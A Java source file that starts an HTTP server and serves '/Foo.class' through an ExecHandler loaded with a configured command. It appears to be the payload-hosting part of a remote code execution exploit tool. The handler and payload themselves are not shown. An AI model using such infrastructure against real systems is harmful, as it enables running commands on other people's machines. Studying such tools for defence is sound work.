package server.http;

import cli.Config;
import com.sun.net.httpserver.HttpServer;
import server.Server;
import server.http.handler.ExecHandler;

import java.io.IOException;
import java.net.InetSocketAddress;

public class HTTPServer implements Server {

    private Config cfg;

    public Server acceptCfg(Config cfg) {
        this.cfg = cfg;
        return this;
    }

    @Override
    public void run() {
        int hp = cfg.hp;
        String command = cfg.command;
        try {
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(hp), 0);
            httpServer.createContext("/Foo.class", new ExecHandler().acceptCmd(command));
            httpServer.start();
            System.out.printf("[HTTP] listen on %d...\n", hp);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
